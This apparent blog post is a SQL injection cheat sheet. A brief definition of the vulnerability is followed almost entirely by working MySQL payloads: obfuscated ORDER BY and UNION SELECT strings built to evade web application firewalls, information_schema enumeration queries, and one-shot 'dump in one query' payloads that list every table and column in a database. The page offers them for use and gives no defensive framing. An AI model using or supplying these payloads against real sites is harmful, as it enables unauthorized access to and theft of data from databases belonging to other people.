---
title: sql injection
date: 2019-04-13 00:00:00 +5:30
categories: [cheat sheat, SQL]
tags: [sql injection] # add tag
image: /assets/img/sql/sql.png
---

# CHEAT SHEAT SQL INJECTION

## SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. 

## the following is a set of sql injection query

### ORDER BY
```bash
order by 1 asc-- -
+%0Aorder+%0Aby+1--+-
+/*!50000ORDER%20BY*/+1--+-
/**/ORDER/**/BY/**/
/*!order*/+/*!by*/
/*!ORDER BY*/
/*!50000ORDER BY*/
/*!50000ORDER*//**//*!50000BY*/
/*!12345ORDER*/+/*!BY*/
```
### UNION SELECT
```bash
AnD point(29,9) /*!50000UnION+*/ /*!50000SelEcT+*/
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+
```
### information_schema.tables
```bash
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table 
```
### concat()
```bash
CoNcAt()
concat() 
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))
```
### group_concat()
```bash
/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()
/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
unhex(hex(group_concat(table_name)))
unhex(hex(/*!group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
unhex(hex(/*!50000group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
convert(group_concat(table_name)+using+ascii)
convert(group_concat(/*!table_name*/)+using+ascii)
convert(group_concat(/*!12345table_name*/)+using+ascii)
convert(group_concat(/*!50000table_name*/)+using+ascii)
CONVERT(group_concat(table_name)+USING+latin1)
CONVERT(group_concat(table_name)+USING+latin2)
CONVERT(group_concat(table_name)+USING+latin3)
CONVERT(group_concat(table_name)+USING+latin4)
CONVERT(group_concat(table_name)+USING+latin5)
```

### Dios

```bash
/*!50000make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)*/

(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))

(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))

make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

concat_ws('<br>','AZZATSSINS',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))

(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.schemata)%20where%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,schema_name))))x)

(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.tables)%20where%20(table_schema=database())%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,table_name))))x)

concat(@c:=0x00,if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)

concat%0b(@c:=0x00,if((select%20count(*)%20from%20/*!50000information_schema*/.columns%20/*!50000where*/%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat%0b(@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)

concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0)%20from(information_schema./**/columns)where(table_schema=database())%20and(0x00)in(@x:=Concat/*!(@x,%200x3c62723e,%20if(%20(@tbl!=table_name),%20Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,%202,%200x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e),%200x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/

export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)

(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b),%200x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+if%20null(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)

+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+

(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))

(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)

(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))

make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```
